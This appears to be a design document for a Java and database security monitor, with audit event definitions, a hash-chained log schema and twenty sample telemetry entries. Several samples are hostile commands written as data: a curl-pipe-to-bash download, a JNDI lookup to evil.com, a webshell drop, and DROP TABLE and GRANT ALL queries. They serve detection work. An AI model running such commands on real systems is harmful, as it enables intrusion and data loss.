# Session 5: Java & DBMS Implementation Detail
**Project:** Secure System Monitor
**Focus:** Application-Layer Auditing & Cryptographic Log Integrity

---

## 1. Runtime Events: Java JVM & DBMS Context
While previous sessions focused on OS-level eBPF (syscalls), Session 5 shifts up the stack to monitor the Application (Java) and Database (SQL) layers directly via JMX and Database Audit Logs.

1.  **JVMTI_ClassLoad**: A new Java class is dynamically loaded into the JVM (Detects in-memory webshells/deserialization).
2.  **JNDI_Lookup**: The Java Naming and Directory Interface attempts an LDAP/RMI resolution (Detects Log4Shell-style JNDI injections).
3.  **ProcessBuilder_Exec**: Java `java.lang.ProcessBuilder` spawns an OS-level command (Detects RCE via Java apps).
4.  **JDBC_Connection_Create**: A new connection pool request to the DBMS.
5.  **SQL_DDL_Execution**: A `DROP TABLE`, `CREATE USER`, or `GRANT` command is executed on the database (Unauthorized schema/privilege changes).
6.  **SQL_DML_Bulk_Extraction**: A `SELECT` query returns > 10,000 rows (Database Exfiltration).
7.  **Auth_Failed_DBMS**: Incorrect credentials supplied to the PostgreSQL/Oracle database.
8.  **Auth_Failed_Java_App**: Failed login attempt handled by Spring Security/JAAS.
9.  **Java_OutOfMemoryError**: JVM crashes due to heap exhaustion (Potential DoS or memory leak exploit).
10. **File_IO_Java_TempDir**: Application writes a `.jar`, `.jsp`, or `.class` file to `/tmp` (Staging payload).
11. **API_Rate_Limit_Exceeded**: Spring Boot Gateway rate limiter triggered.
12. **Spring_Actuator_Access**: Access to `/actuator/env` or `/actuator/heapdump` (Information Disclosure).

---

## 2. Immutable Log Database Schema
To guarantee forensic non-repudiation, the system uses a **Cryptographic Hash Chain (Blockchain-style)** within a standard relational database (SQLite/PostgreSQL).

**Table: `audit_logs`**
| Column | Type | Constraints | Description |
| :--- | :--- | :--- | :--- |
| `log_id` | VARCHAR(64) | PRIMARY KEY | Unique UUID for the event |
| `timestamp` | TIMESTAMP | NOT NULL | ISO-8601 time of event generation |
| `source_system`| VARCHAR(128)| NOT NULL | e.g., 'EHR-Java-App-01', 'PG-DB-Core' |
| `event_category`| VARCHAR(64) | NOT NULL | 'FILE_PROC' or 'API_SENSOR' |
| `event_type` | VARCHAR(64) | NOT NULL | Action type (e.g., 'JNDI_Lookup') |
| `severity` | VARCHAR(16) | NOT NULL | INFO, MEDIUM, HIGH, CRITICAL |
| `payload_json` | TEXT | NOT NULL | The raw telemetry details |
| `previous_hash`| CHAR(64) | NOT NULL | SHA-256 hash of the chronological predecessor |
| `current_hash` | CHAR(64) | NOT NULL | SHA-256(`timestamp` + `event_type` + `payload_json` + `previous_hash`) |

---

## 3. Cryptographic Log Integrity (SHA-256 Hashing)
**Concept:** Attackers often try to delete or modify logs (e.g., `DELETE FROM audit_logs WHERE payload_json LIKE '%dr_smith%'`) to hide their tracks. 
**Defence Mechanism:**
When a new log `N` is ingested:
1. The ingestion engine queries the database for the `current_hash` of log `N-1`.
2. It constructs a string: `DataString = N.timestamp + N.event_type + N.payload_json + Hash(N-1)`.
3. It computes `Hash(N) = SHA-256(DataString)`.
4. It inserts log `N` with `previous_hash = Hash(N-1)` and `current_hash = Hash(N)`.

**Validation:** If an attacker modifies or deletes a historical log row, recalculating the chain from genesis will result in a hash mismatch at the tampered row, proving the ledger is broken.

---

## 4. Sample Datasets (20 Entries)

### A. File / Process Logs (Java Context)
1. `{"file": "/var/log/tomcat/catalina.out", "action": "FILE_APPEND", "process": "java", "pid": 4102}`
2. `{"class": "Exploit.class", "action": "JVMTI_ClassLoad", "class_loader": "WebappClassLoader"}`
3. `{"command": "sh -c 'curl 10.0.0.5/payload.sh | bash'", "action": "ProcessBuilder_Exec", "parent": "java"}`
4. `{"file": "/tmp/hsperfdata_root/4102", "action": "FILE_READ", "process": "java"}`
5. `{"file": "/opt/ehr/config/application.properties", "action": "FILE_READ", "process": "java"}`
6. `{"file": "/tmp/webshell.jsp", "action": "FILE_CREATE", "process": "java"}`
7. `{"event": "Java_OutOfMemoryError", "heap_used_mb": 4096, "thread": "http-nio-8080-exec-1"}`
8. `{"file": "/etc/shadow", "action": "FILE_READ_DENIED", "process": "java", "uid": "tomcat"}`
9. `{"class": "javax.naming.InitialContext", "action": "JNDI_Lookup", "target": "ldap://evil.com/a"}`
10. `{"file": "/opt/ehr/lib/log4j-core-2.14.0.jar", "action": "FILE_OPEN", "process": "java"}`

### B. API / Sensor Logs (DBMS & Network Context)
11. `{"api_path": "/api/v1/auth", "action": "Auth_Failed_Java_App", "username": "admin", "ip": "192.168.1.100"}`
12. `{"api_path": "/actuator/env", "action": "Spring_Actuator_Access", "ip": "10.0.5.55"}`
13. `{"db": "ehr_prod", "action": "JDBC_Connection_Create", "user": "app_user", "pool_size": 45}`
14. `{"query": "DROP TABLE patient_records;", "action": "SQL_DDL_Execution", "user": "postgres"}`
15. `{"query": "SELECT * FROM billing_info;", "action": "SQL_DML_Bulk_Extraction", "rows_returned": 24500}`
16. `{"db": "ehr_prod", "action": "Auth_Failed_DBMS", "user": "root", "reason": "password authentication failed"}`
17. `{"api_path": "/api/v1/patients/query", "action": "API_Rate_Limit_Exceeded", "ip": "45.33.22.11"}`
18. `{"api_path": "/api/v1/prescriptions", "method": "POST", "status": 201, "latency_ms": 112}`
19. `{"sensor": "HL7_Parser", "action": "Malformed_Packet_Dropped", "reason": "Segment out of bounds"}`
20. `{"query": "GRANT ALL PRIVILEGES ON DATABASE ehr_prod TO guest;", "action": "SQL_DDL_Execution", "user": "dba_admin"}`

---

## 5. Simple Log Visualization Approach
The React Dashboard will implement a **Cryptographic Audit Viewer**.
*   **Tabular View**: A dense, wide data table displaying `Timestamp`, `Source`, `Event`, and JSON `Payload`.
*   **Integrity Indicators**: Next to each row, a visual marker (e.g., a green lock icon `🔒`) indicates the signature is valid.
*   **Chain Inspector**: Clicking a row reveals a modal showing:
    *   `[Hash(N-1)]`: The hash of the previous event.
    *   `[Local Data]`: The JSON payload.
    *   `[Hash(N)]`: The resultant hash binding them together.
*   *Purpose*: This proves to compliance auditors (HIPAA/GDPR) that the telemetry logs used by the detection engine have not been tampered with post-ingestion.
